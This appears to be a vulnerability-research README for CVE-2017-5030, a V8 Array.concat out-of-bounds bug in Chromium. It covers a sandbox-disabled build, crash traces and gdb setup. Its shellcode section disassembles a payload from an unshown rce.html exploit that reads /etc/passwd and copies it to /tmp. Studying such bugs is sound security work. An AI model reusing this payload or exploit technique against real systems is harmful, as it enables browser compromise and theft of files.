# CVE-2017-5030

```
$ export PATH=/opt/depot_tools/:$PATH
$ docker run -it \
    -v /hack/chromium/:/hack/chromium \
    -v /opt/depot_tools/:/opt/depot_tools \
    -v /tmp/.X11-unix/:/tmp/.X11-unix/ \
    gipi/chrome-build \
    /bin/bash
$ DISPLAY=:0.0 ./out/CVE/chrome --no-sandbox --no-suid-sandbox
```

Take in mind that ``DCHECK`` in debug builds prevent from using the PoC
since causes the crash of the process.

I advice to use the following oneliner to create a ``tags`` file for
quick jumps to definitions

```
$ find src/ -name '*.cc' -or -name '*.h' -print0 | xargs --null ctags -a
```
```
#
# Fatal error in ../../v8/src/objects-inl.h, line 2496
# Check failed: index >= 0 && index < this->length().
#

==== C stack trace ===============================

    /hack/chromium/src/out/CVE/./libv8_libbase.so(+0x15f83) [0x7f63069c0f83]
    /hack/chromium/src/out/CVE/./libv8_libbase.so(V8_Fatal+0xdd) [0x7f63069bc78d]
    /hack/chromium/src/out/CVE/./libv8.so(+0x268d61) [0x7f63118c1d61]
    [0x187b0ec0444e]
Received signal 4 ILL_ILLOPN 7f63069bfc42
#0 0x7f631da1442e base::debug::StackTrace::StackTrace()
#1 0x7f631da13f6f base::debug::(anonymous namespace)::StackDumpSignalHandler()
#2 0x7f631de86150 <unknown>
#3 0x7f63069bfc42 v8::base::OS::Abort()
#4 0x7f63118c1d61 v8::internal::Builtin_Impl_ArrayConcat()
#5 0x187b0ec0444e <unknown>
  r8: 00007f6309cda870  r9: 00007f62fae23000 r10: 0000000000000078 r11: 00007ffe390de3c0
 r12: 00007f6309cd9800 r13: 0000000000000020 r14: 00007f63122822da r15: 00000000000009c0
  di: 00007f6309cd9640  si: 00007f6309cda870  bp: 00007ffe390deab0  bx: 00007ffe390de7c8
  dx: 0000000000000000  ax: 0000000000000000  cx: 0000000000000b40  sp: 00007ffe390de7b8
  ip: 00007f63069bfc42 efl: 0000000000010202 cgf: 002b000000000033 erf: 0000000000000000
 trp: 0000000000000006 msk: 0000000000000000 cr2: 0000000000000000
```


```
dcheck_always_on  Default = false
    //build/config/dcheck_always_on.gni:7
    Set to true to enable dcheck in Release builds
```

## GDB

If you want to use ``gdb`` take in mind that ``chrome`` launches tabs in separate processes,
so in order to debug the vulnerable methods you have to find which tab corresponds to a given process
using the key combination ``Shift-Esc``.

In our case we want to break in the ``BUILTIN(ArrayConcat)`` so

```
(gdb) b builtins-array.cc:1341
Breakpoint 1 at 0x7f6e9f9b22ad: file ../../v8/src/builtins/builtins-array.cc, line 1341.
(gdb) c
Continuing.

Thread 1 "chrome" hit Breakpoint 1, (anonymous namespace)::(anonymous namespace)::Builtin_Impl_ArrayConcat (args=..., isolate=0x3117adf2e020) at ../../v8/src/builtins/builtins-array.cc:1345
1345      if (receiver->IsNullOrUndefined(isolate)) {
```

```
(gdb) python
>sys.path.insert(0, '/hack/chromium/src/tools/gdb/')
>import gdb_chrome
```


## Shellcode

This is extracted from [rce.html](rce.html)

```
> import struct
> shellcode = [ ... ]
> raw = ''.join([struct.pack("I", _) for _ in shellcode])
> f = open("/tmp/shellcode.bin", "wb")
> f.write(raw)
> f.close()
```

```
$ r2 /tmp/shellcode.bin
[0x00000000]> pdf
/ (fcn) fcn.00000000 136
|   fcn.00000000 ();
|           0x00000000      4831c0         xor rax, rax
|           0x00000003      4831f6         xor rsi, rsi
|           0x00000006      4831ff         xor rdi, rdi
|           0x00000009      4831d2         xor rdx, rdx
|           0x0000000c      50             push rax
|           0x0000000d      48bb2f746d70.  movabs rbx, 0x6161612f706d742f ; "/tmp/aaa"
|           0x00000017      53             push rbx
|           0x00000018      4989e1         mov r9, rsp
|           0x0000001b      50             push rax
|           0x0000001c      bb73776400     mov ebx, 0x647773              ; "swd"
|           0x00000021      53             push rbx
|           0x00000022      48bb2f657463.  movabs rbx, 0x7361702f6374652f ; "/etc/pas"
|           0x0000002c      53             push rbx
|           0x0000002d      4889e7         mov rdi, rsp
|           0x00000030      4831f6         xor rsi, rsi
|           0x00000033      b002           mov al, 2
|           0x00000035      0f05           syscall                        ; open()
|           0x00000037      4889c7         mov rdi, rax
|           0x0000003a      4831c0         xor rax, rax
|           0x0000003d      4881ec001000.  sub rsp, 0x1000
|           0x00000044      ba00100000     mov edx, 0x1000
|           0x00000049      4889e6         mov rsi, rsp
|           0x0000004c      0f05           syscall                        ; read()
|           0x0000004e      4989c2         mov r10, rax
|           0x00000051      4831c0         xor rax, rax
|           0x00000054      4989f0         mov r8, rsi
|           0x00000057      4831d2         xor rdx, rdx
|           0x0000005a      bab6010000     mov edx, 0x1b6
|           0x0000005f      be42000000     mov esi, 0x42
|           0x00000064      4c89cf         mov rdi, r9
|           0x00000067      b002           mov al, 2
|           0x00000069      0f05           syscall                       ; open("/tmp/aaa")
|           0x0000006b      4889c7         mov rdi, rax
|           0x0000006e      4889e6         mov rsi, rsp
|           0x00000071      4c89d2         mov rdx, r10
|           0x00000074      b801000000     mov eax, 1
|           0x00000079      0f05           syscall                       ; write()
|           0x0000007b      bf01000000     mov edi, 1
|           0x00000080      b83c000000     mov eax, 0x3c
|           0x00000085      0f05           syscall                       ; exit(1)
\           0x00000087      f4             hlt
```

## Links

 - [Security: Out-of-bounds read in V8 Array.concat](https://bugs.chromium.org/p/chromium/issues/detail?id=682194)
 - https://www.chromium.org/developers/gn-build-configuration
 - https://chromium.googlesource.com/chromium/src/+/master/tools/gn/docs/quick_start.md
 - https://www.rapid7.com/db/vulnerabilities/google-chrome-cve-2017-5030
 - https://github.com/tunz/js-vuln-db/blob/master/v8/CVE-2017-5030.md
 - https://chromium.googlesource.com/chromium/src/+/lkcr/docs/linux_debugging.md 
 - https://brookhong.github.io/2016/10/09/debug-chrome-with-gdb.html
 - https://blog.sessionstack.com/how-javascript-works-inside-the-v8-engine-5-tips-on-how-to-write-optimized-code-ac089e62b12e
 - https://github.com/v8/v8/wiki
 - https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775
 - https://thibaultlaurens.github.io/javascript/2013/04/29/how-the-v8-engine-works/
 - https://mrale.ph/v8/resources.html

